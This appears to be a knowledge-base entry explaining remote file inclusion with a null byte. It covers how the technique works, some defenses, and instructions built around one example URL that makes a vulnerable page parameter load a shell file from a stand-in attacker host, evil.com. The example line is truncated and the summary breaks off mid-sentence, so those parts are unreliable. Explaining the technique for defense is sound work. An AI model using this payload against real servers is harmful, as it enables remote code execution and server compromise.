---
id: 3c9450ec-edda-439a-8b11-53d1c75f7aa6
name: Basic RFI with Null Byte
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:55:58.200290+00:00'
updated_at: '2023-04-10T20:22:13.824063+00:00'
tags:
- '[[Basic RFI]]'
- '[[File Inclusion]]'
- '[[Null byte]]'
---

# Basic RFI with Null Byte

## Summary

Basic RFI with Null Byte is a technique used by attackers to exploit web applications that include user input in file paths without proper sanitization. This technique involves appending a null byte (%00) to the end of the file path to bypass filters that are not properly configured. Once the attac

## Description

# Description

Basic RFI with Null Byte is a technique used by attackers to exploit web applications that include user input in file paths without proper sanitization. This technique involves appending a null byte (%00) to the end of the file path to bypass filters that are not properly configured. Once the attacker is able to include their own file, they can execute arbitrary code on the server.

From a technical perspective, this technique works by exploiting the way that some programming languages handle null bytes in strings. In many cases, a null byte is used to terminate a string, which means that anything after the null byte is ignored. By appending a null byte to the end of a file path, an attacker can trick the application into including their own file instead.

The business value of this technique is that it allows attackers to gain access to sensitive data or execute arbitrary code on a server, which can lead to data theft, system compromise, or other malicious activity.

 

## Requirements

1. Access to a vulnerable web application

 

## Defense

1. Sanitize user input by removing or encoding special characters

1. Configure filters to block null bytes in file paths

1. Monitor web application logs for suspicious activity

 

## Objectives

1. To exploit a web application that includes user input in file paths without proper sanitization

1. To execute arbitrary code on the server

 

# Instructions

1. To execute this command, replace 'http://example.com/index.php?page=' with the vulnerable file path of the target web application, and replace 'http://evil.com/shell.txt' with the URL of the attacker's shell file.

 



**Code**: [[http://example.com/index.php?page=http://evil.com/]]



> This command exploits a vulnerable web application that includes user input in file paths without proper sanitization. The '%00' appended at the end of the URL is a null byte that tricks the application into including the attacker's shell file instead of the intended file. Once the shell file is included, the attacker can execute arbitrary code on the server.

## Tags

- [[Basic RFI]]
- [[File Inclusion]]
- [[Null byte]]


